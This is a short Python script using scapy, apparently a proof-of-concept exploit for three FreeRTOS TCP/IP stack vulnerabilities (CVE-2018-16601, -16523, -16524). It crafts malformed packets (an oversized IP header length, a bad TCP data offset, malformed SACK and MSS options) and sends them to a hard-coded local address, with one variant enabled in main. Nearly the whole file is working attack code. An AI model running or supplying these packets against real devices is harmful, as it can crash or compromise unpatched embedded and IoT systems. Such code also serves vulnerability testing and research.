#！ encoding=utf-8
from scapy.all import *

def freeRTOS_CVE_2018_16601(addr):
	ip_pkt = IP(dst=addr[0])/TCP(dport=addr[1])
	# ip_pkt.version = 0x4
	ip_pkt.ihl = 0xf
	print(ip_pkt.show())
	eth = Ether()/ip_pkt
	print(bytes(ip_pkt))
	send(ip_pkt)
	# sendp(eth, iface="TestNet")

def freeRTOS_CVE_2018_16523(addr):
	TCP_OPT_SACK_A = 5
	p_len = 255
	payload = chr(TCP_OPT_SACK_A) + chr(p_len) + "Payload"
	tcp_pkt = TCP(dport=addr[1])/payload
	tcp_pkt.dataofs = 0xf
	# tcp_pkt.options = [b"xxxx"]
	print(bytes(tcp_pkt))
	ip_pkt = IP(dst=addr[0])/tcp_pkt
	send(ip_pkt)

def freeRTOS_CVE_2018_16524(addr):
	TCP_OPT_MSS = 2
	TCP_OPT_MSS_LEN = 4
	payload = chr(TCP_OPT_MSS) + chr(TCP_OPT_MSS_LEN) + chr(0) + chr(0) + chr(0)
	tcp_pkt = TCP(dport=addr[1])/payload
	tcp_pkt.dataofs = 0xf
	print(bytes(tcp_pkt))
	ip_pkt = IP(dst=addr[0])/tcp_pkt
	send(ip_pkt)

def main():
	conf.use_pcap = True
	addr = ["192.168.137.18", 7]
	# freeRTOS_CVE_2018_16601(addr)
	# freeRTOS_CVE_2018_16523(addr)
	freeRTOS_CVE_2018_16524(addr)

if __name__ == "__main__":
	main()
